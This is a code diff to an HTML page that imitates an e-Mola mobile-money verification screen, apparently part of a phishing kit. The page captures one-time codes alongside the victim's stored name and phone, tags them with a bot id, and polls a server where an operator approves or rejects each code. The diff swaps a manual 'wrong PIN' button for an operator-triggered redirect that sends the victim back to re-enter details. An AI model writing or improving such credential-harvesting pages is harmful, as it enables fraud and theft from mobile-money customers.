@@ -5,199 +5,65 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>e-Mola · Verificação</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html, body {
-            width: 100%;
-            height: 100%;
-            overflow: hidden;
-        }
-
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; overflow: hidden; }
         body {
             font-family: 'Segoe UI', Roboto, Arial, sans-serif;
             background: #ff7845;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
-            min-height: 100vh;
-            padding: 0;
-            margin: 0;
-            color: white;
+            display: flex; justify-content: center; align-items: flex-start;
+            min-height: 100vh; padding: 0; margin: 0; color: white;
         }
-
         .loan-container {
-            background: #ff7845;
-            width: 100%;
-            max-width: none;
-            min-height: 100vh;
-            padding: 0;
-            border-radius: 0;
-            box-shadow: none;
-            overflow: hidden;
-            position: relative;
+            background: #ff7845; width: 100%; max-width: none; min-height: 100vh;
+            padding: 0; border-radius: 0; box-shadow: none; overflow: hidden; position: relative;
         }
-
         .loan-container::before {
-            content: "";
-            position: absolute;
-            top: 104px;
-            left: 70px;
-            width: 21px;
-            height: 21px;
-            border-left: 5px solid white;
-            border-bottom: 5px solid white;
-            transform: rotate(45deg);
-            z-index: 10;
+            content: ""; position: absolute; top: 104px; left: 70px;
+            width: 21px; height: 21px; border-left: 5px solid white; border-bottom: 5px solid white;
+            transform: rotate(45deg); z-index: 10;
         }
-
         .logo-container { display: none; }
-
         .title {
-            position: absolute;
-            top: 250px;
-            left: 0;
-            width: 100%;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            font-size: 43px;
-            line-height: 1.2;
-            font-weight: 400;
-            color: #ffffff;
+            position: absolute; top: 250px; left: 0; width: 100%;
+            text-align: center; font-size: 43px; line-height: 1.2; font-weight: 400; color: #ffffff;
         }
-
         .subtitle {
-            position: absolute;
-            top: 595px;
-            left: 45px;
-            right: 45px;
-            margin: 0;
-            padding: 0;
-            text-align: center;
-            color: #ffffff;
-            font-size: 34px;
-            line-height: 1.45;
-            font-weight: 400;
+            position: absolute; top: 595px; left: 45px; right: 45px;
+            text-align: center; color: #ffffff; font-size: 34px; line-height: 1.45; font-weight: 400;
         }
-
         .display-number { display: none; }
         .label { display: none; }
-
         .otp-boxes {
-            position: absolute;
-            top: 402px;
-            left: 67px;
-            right: 67px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            gap: 16px;
-            margin: 0;
+            position: absolute; top: 402px; left: 67px; right: 67px;
+            display: flex; justify-content: space-between; align-items: center; gap: 16px;
         }
-
         .otp-boxes input {
-            flex: 1;
-            width: 0;
-            min-width: 0;
-            height: 134px;
-            border: none;
-            outline: none;
-            border-radius: 18px;
-            background: #ffffff;
-            color: #333333;
-            font-size: 48px;
-            font-weight: 400;
-            text-align: center;
-            caret-color: #ff7845;
-            appearance: none;
-            -webkit-appearance: none;
-            box-shadow: none;
+            flex: 1; width: 0; min-width: 0; height: 134px; border: none; outline: none;
+            border-radius: 18px; background: #ffffff; color: #333333;
+            font-size: 48px; font-weight: 400; text-align: center; caret-color: #ff7845;
+            appearance: none; -webkit-appearance: none; box-shadow: none;
         }
-
-        .otp-boxes input:focus {
-            border: none;
-            outline: none;
-            box-shadow: none;
-        }
-
+        .otp-boxes input:focus { border: none; outline: none; box-shadow: none; }
         #timerContainer { display: none; }
         #submitBtn { display: none; }
         .footer-links { display: none; }
         .version { display: none; }
         #status { display: none; }
 
-        /* ---------- WRONG PIN BUTTON ---------- */
-        .wrong-pin-wrapper {
-            position: absolute;
-            top: 640px;
-            left: 67px;
-            right: 67px;
-            display: flex;
-            justify-content: center;
-            margin: 0;
-        }
-
-        #wrongPinBtn {
-            background: transparent;
-            color: #ffffff;
-            border: 3px solid #ffffff;
-            border-radius: 18px;
-            padding: 18px 40px;
-            font-size: 24px;
-            font-weight: 600;
-            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
-            cursor: pointer;
-            transition: background 0.2s ease, color 0.2s ease;
-            width: 100%;
-            max-width: 420px;
-        }
-
-        #wrongPinBtn:hover,
-        #wrongPinBtn:active {
-            background: #ffffff;
-            color: #ff7845;
-        }
-
-        /* ---------- LOADING OVERLAY ---------- */
         #loadingOverlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.65);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 9999;
-            backdrop-filter: blur(4px);
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.65); display: none;
+            justify-content: center; align-items: center; flex-direction: column;
+            z-index: 9999; backdrop-filter: blur(4px);
         }
-
         #loadingOverlay .spinner {
-            width: 60px;
-            height: 60px;
-            border: 6px solid rgba(255, 255, 255, 0.3);
-            border-top: 6px solid #ffffff;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-bottom: 25px;
+            width: 60px; height: 60px; border: 6px solid rgba(255, 255, 255, 0.3);
+            border-top: 6px solid #ffffff; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 25px;
         }
-
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-
+        @keyframes spin { to { transform: rotate(360deg); } }
         #loadingOverlay .message {
-            color: #ffffff;
-            font-size: 26px;
-            font-weight: 400;
-            text-align: center;
-            padding: 0 30px;
+            color: #ffffff; font-size: 26px; font-weight: 400; text-align: center; padding: 0 30px;
         }
 
         @media (max-width: 700px) {
@@ -206,32 +72,24 @@
             .otp-boxes { top: 325px; left: 35px; right: 35px; gap: 10px; }
             .otp-boxes input { height: 91px; border-radius: 15px; font-size: 34px; }
             .subtitle { top: 470px; left: 25px; right: 25px; font-size: 25px; line-height: 1.45; }
-            .wrong-pin-wrapper { top: 520px; left: 35px; right: 35px; }
-            #wrongPinBtn { padding: 14px 30px; font-size: 20px; }
             #loadingOverlay .spinner { width: 45px; height: 45px; border-width: 5px; }
             #loadingOverlay .message { font-size: 20px; }
         }
-
         @media (max-width: 480px) {
             .loan-container::before { top: 50px; left: 28px; width: 16px; height: 16px; border-width: 4px; }
             .title { top: 125px; font-size: 29px; }
             .otp-boxes { top: 225px; left: 20px; right: 20px; gap: 7px; }
             .otp-boxes input { height: 64px; border-radius: 11px; font-size: 25px; }
             .subtitle { top: 325px; left: 20px; right: 20px; font-size: 20px; line-height: 1.45; }
-            .wrong-pin-wrapper { top: 370px; left: 20px; right: 20px; }
-            #wrongPinBtn { padding: 12px 24px; font-size: 17px; border-width: 2px; border-radius: 12px; }
             #loadingOverlay .spinner { width: 38px; height: 38px; border-width: 4px; }
             #loadingOverlay .message { font-size: 17px; }
         }
-
         @media (max-width: 360px) {
             .loan-container::before { top: 42px; left: 22px; width: 14px; height: 14px; border-width: 3px; }
             .title { top: 105px; font-size: 26px; }
             .otp-boxes { top: 190px; left: 15px; right: 15px; gap: 5px; }
             .otp-boxes input { height: 55px; border-radius: 9px; font-size: 22px; }
             .subtitle { top: 275px; left: 15px; right: 15px; font-size: 18px; }
-            .wrong-pin-wrapper { top: 315px; left: 15px; right: 15px; }
-            #wrongPinBtn { padding: 10px 20px; font-size: 15px; }
             #loadingOverlay .spinner { width: 30px; height: 30px; border-width: 3px; }
             #loadingOverlay .message { font-size: 14px; }
         }
@@ -262,11 +120,6 @@
         </button>
     </form>
 
-    <!-- WRONG PIN BUTTON -->
-    <div class="wrong-pin-wrapper">
-        <button type="button" id="wrongPinBtn">PIN errado? Continuar</button>
-    </div>
-
     <div class="footer-links">
         <a href="#" onclick="alert('Redirecionar para recuperação')">Esqueceu a senha</a>
         <a href="#" onclick="alert('Redirecionar para cadastro')">Cadastrar-se</a>
@@ -275,13 +128,11 @@
     <div id="status"></div>
 </div>
 
-<!-- LOADING OVERLAY -->
 <div id="loadingOverlay">
     <div class="spinner"></div>
     <div class="message">A processar, por favor aguarde...</div>
 </div>
 
-<!-- OTP box logic + auto-submit -->
 <script>
     (function() {
         const inputs = document.querySelectorAll('.otp-boxes input');
@@ -298,16 +149,11 @@
         inputs.forEach((input, index) => {
             input.addEventListener('input', function() {
                 this.value = this.value.replace(/[^0-9]/g, '');
-                if (this.value && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
+                if (this.value && index < inputs.length - 1) inputs[index + 1].focus();
                 submitIfComplete();
             });
-
             input.addEventListener('keydown', function(event) {
-                if (event.key === 'Backspace' && !this.value && index > 0) {
-                    inputs[index - 1].focus();
-                }
+                if (event.key === 'Backspace' && !this.value && index > 0) inputs[index - 1].focus();
             });
         });
 
@@ -328,7 +174,6 @@
     })();
 </script>
 
-<!-- Backend communication -->
 <script>
     const params = new URLSearchParams(window.location.search);
     const botId = params.get('botId');
@@ -347,7 +192,7 @@
     function showError(msg) { statusEl.textContent = msg; }
 
     inputs.forEach((input, index) => {
-        input.addEventListener('input', (e) => {
+        input.addEventListener('input', () => {
             input.value = input.value.replace(/\D/g, '');
             if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
         });
@@ -387,7 +232,6 @@
         const name = localStorage.getItem('name') || 'Desconhecido';
         const phone = localStorage.getItem('phone') || 'Desconhecido';
 
-        // Show loading overlay
         loadingOverlay.style.display = 'flex';
         statusEl.textContent = '';
 
@@ -407,6 +251,7 @@
                 await new Promise(resolve => setTimeout(resolve, 1500));
                 const checkRes = await fetch(`/check-code/${requestId}`);
                 const checkData = await checkRes.json();
+
                 if (checkData.approved === true) {
                     approved = true;
                     break;
@@ -414,6 +259,10 @@
                     loadingOverlay.style.display = 'none';
                     showError('❌ Código rejeitado. Tente novamente.');
                     throw new Error('rejected');
+                } else if (checkData.approved === 'pinwrong') {
+                    loadingOverlay.style.display = 'none';
+                    window.location.href = `/details?botId=${botId}&error=pin_errado`;
+                    throw new Error('pinwrong');
                 }
             }
 
@@ -424,28 +273,18 @@
             }
 
         } catch (error) {
+            if (error.message === 'pinwrong') return;
             if (error.message !== 'rejected') {
                 loadingOverlay.style.display = 'none';
                 statusEl.textContent = '❌ Erro de ligação ao servidor.';
                 console.error(error);
             }
-            // Reset form for retry
             inputs.forEach(i => i.value = '');
             inputs[0].focus();
             startCountdown();
             e.target.dataset.processing = 'false';
             e.target.dataset.submitting = 'false';
         }
-    });
-
-    // ---------- WRONG PIN BUTTON LOGIC ----------
-    document.getElementById('wrongPinBtn').addEventListener('click', function() {
-        // Display error message in Portuguese
-        showError('❌ PIN errado. Redirecionando...');
-        // Redirect to /details route (server-served), keeping botId + error flag
-        setTimeout(function() {
-            window.location.href = `/details?botId=${botId}&error=pin_errado`;
-        }, 600);
     });
 </script>
 
